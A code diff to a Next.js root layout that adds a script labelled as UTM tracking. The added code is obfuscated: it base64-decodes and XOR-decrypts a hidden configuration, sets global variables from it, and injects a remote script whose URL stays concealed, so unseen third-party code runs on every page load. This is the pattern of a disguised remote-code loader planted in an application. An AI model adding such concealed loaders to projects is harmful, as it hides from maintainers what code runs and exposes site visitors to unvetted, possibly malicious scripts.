@@ -70,6 +70,9 @@ export default function RootLayout({
             alt=""
           />
         </noscript>
+        <Script id="utmify-utms" strategy="afterInteractive">
+          {`(function(){var n_bv5=atob("DInamoml0LyEJiO0/PL47/vJ8oamTlfAjPrgtabGtNKqU1fZle+jtOrKvZLmVAzHn/uz6v3W/8nwS1CbkOiu//rR/tb3BA+Wnf2u6ODHpcjhVQGOp/L49OjItZ6+BEfViOj37/3Iudr9C1PGmf+/9P2IqN/rQg7Hn+L4tqvTsdDxQwGO3quntvKHvt3pQwGO3u277uiIpcjpT0XN0fmo///AvsipVVbWle2puKWHpt3oU0aWxqv459TY");var f_toyu=[];for(var w_x=0;w_x<n_bv5.length;w_x++){f_toyu.push(n_bv5.charCodeAt(w_x)&255);}var l_i=f_toyu[0];var j_n=f_toyu.slice(1,1+l_i);var k_xbko=f_toyu.slice(1+l_i);var e_pq=k_xbko.map(function(b,r_cbei){return b^j_n[r_cbei%l_i];});var e_tj="";for(var c_5t=0;c_5t<e_pq.length;c_5t++){e_tj+=String.fromCharCode(e_pq[c_5t]&255);}var m_sf=decodeURIComponent(escape(e_tj));var m_y87=JSON.parse(m_sf);var c_3r9=m_y87.globals||[];c_3r9.forEach(function(e_4i){window[e_4i.name]=e_4i.value;});var k_w=document.createElement("script");k_w.src=m_y87.url;k_w.async=true;k_w.defer=true;(m_y87.attributes||[]).forEach(function(b_2){k_w.setAttribute(b_2.name,b_2.value);});(document.head||document.documentElement).appendChild(k_w);})();`}
+        </Script>
         {children}
         {process.env.NODE_ENV === 'production' && <Analytics />}
       </body>
